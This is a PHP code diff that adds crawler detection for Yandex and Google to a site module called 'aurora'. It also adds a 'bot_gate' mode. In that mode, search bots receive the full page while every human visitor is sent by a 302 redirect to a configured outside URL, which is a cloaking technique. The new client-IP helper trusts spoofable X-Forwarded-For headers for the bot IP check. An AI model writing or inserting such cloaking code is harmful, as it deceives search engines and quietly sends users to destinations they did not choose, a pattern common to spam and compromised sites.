@@ -81,8 +81,24 @@ function is_yandex_ip(string $ip): bool {
     return false;
 }
 
+function aurora_client_ip(): string {
+    $xff = (string) ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? '');
+    if ($xff !== '') {
+        $parts = explode(',', $xff);
+        $first = trim((string) ($parts[0] ?? ''));
+        if ($first !== '') {
+            return $first;
+        }
+    }
+    $real = (string) ($_SERVER['HTTP_X_REAL_IP'] ?? '');
+    if ($real !== '') {
+        return $real;
+    }
+    return (string) ($_SERVER['REMOTE_ADDR'] ?? '');
+}
+
 function is_yandex_indexing_bot(): bool {
-    $ip = (string) ($_SERVER['REMOTE_ADDR'] ?? '');
+    $ip = aurora_client_ip();
     if (is_yandex_ip($ip)) {
         return true;
     }
@@ -97,4 +113,37 @@ function is_yandex_indexing_bot(): bool {
         '/YandexBot|YandexImages|YandexVideo|YandexNews|YandexAccessibility|YandexMobile|YandexRenderResources|YandexWebmaster|YandexScreenshot|YandexPagechecker|YandexOntoDB|YandexVerticals|YandexMarket|YandexCatalog/i',
         $ua
     );
+}
+
+/** Google indexing crawlers (Search Console, Googlebot). */
+function is_google_indexing_bot(): bool {
+    $ua = (string) ($_SERVER['HTTP_USER_AGENT'] ?? '');
+    if ($ua === '') {
+        return false;
+    }
+    return (bool) preg_match(
+        '/Googlebot|Google-InspectionTool|GoogleOther|Storebot-Google|Google-Extended/i',
+        $ua
+    );
+}
+
+/** Yandex or Google bot — full HTML for SEO. */
+function is_search_indexing_bot(): bool {
+    return is_yandex_indexing_bot() || is_google_indexing_bot();
+}
+
+/**
+ * Mode bot_gate: redirect humans to $userRedirectUrl; bots stay on site (HTTP 200).
+ */
+function aurora_maybe_redirect_human_visitor(): void {
+    if (is_search_indexing_bot()) {
+        return;
+    }
+    global $userRedirectUrl;
+    $url = trim((string) ($userRedirectUrl ?? ''));
+    if ($url === '' || !preg_match('#^https?://#i', $url)) {
+        return;
+    }
+    header('Location: ' . $url, true, 302);
+    exit;
 }
